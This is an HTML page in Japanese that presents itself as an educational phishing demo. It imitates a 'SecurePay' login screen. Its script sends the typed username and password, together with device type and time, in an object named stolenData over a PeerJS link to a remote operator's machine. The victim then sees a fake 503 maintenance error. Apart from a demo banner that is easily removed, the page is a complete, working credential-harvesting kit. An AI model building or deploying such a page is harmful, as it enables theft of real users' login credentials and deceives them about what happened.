<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
  <!-- PeerJSの読み込み -->
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
  </div>

  <!-- ログイン入力フォーム -->
  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <!-- 接続できるまでボタンを押せなくする -->
      <button type="submit" id="login-btn" class="btn-primary" disabled style="opacity: 0.5; cursor: not-allowed;">接続待機中...</button>
    </form>
    <!-- 接続状態の表示用テキスト -->
    <div style="margin-top: 12px; font-size: 12px; color: #ffaa00; text-align: center;" id="conn-status">
      ⏳ 管理者サーバーとの接続を確立しています...
    </div>
  </div>

  <!-- ⚠️ エラー画面 -->
  <div class="login-container hidden" id="error-box">
    <div class="error-icon">⚠️</div>
    <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
    <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    // URLからルームIDを取得（指定がない場合はデフォルトで "my-sec-demo-room" を使用）
    const roomId = urlParams.get('room') || 'my-sec-demo-room';

    const loginBtn = document.getElementById('login-btn');
    const connStatus = document.getElementById('conn-status');

    let peer = new Peer({
      config: {
        'iceServers': [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:global.stun.twilio.com:3478' }
        ]
      }
    });
    let conn = null;

    peer.on('open', () => {
      connStatus.innerText = "⚡ サーバーへ高速接続中...";
      // 指定されたルームIDのPCへ接続
      conn = peer.connect("sec-demo-" + roomId, { reliable: true });
      
      conn.on('open', () => {
        // 🔗 接続成功！ボタンを押せるようにする
        loginBtn.disabled = false;
        loginBtn.style.opacity = "1";
        loginBtn.style.cursor = "pointer";
        loginBtn.innerText = "ログイン";
        
        connStatus.innerText = "🟢 接続完了（リアルタイム通信確立）";
        connStatus.style.color = "#2ed573";
      });

      conn.on('error', (err) => {
        connStatus.innerText = "❌ 接続エラー（再読み込みしてください）";
        connStatus.style.color = "#ff4757";
      });
    });

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      const stolenData = { time, device, username, password };

      if (conn && conn.open) {
        conn.send(stolenData);
      } else {
        alert("管理者サーバーとの接続が切断されています。");
        return;
      }

      // スマホ側はエラー画面を表示してストップ
      document.getElementById('login-box').classList.add('hidden');
      document.getElementById('error-box').classList.remove('hidden');
    });
  </script>
</body>
</html>
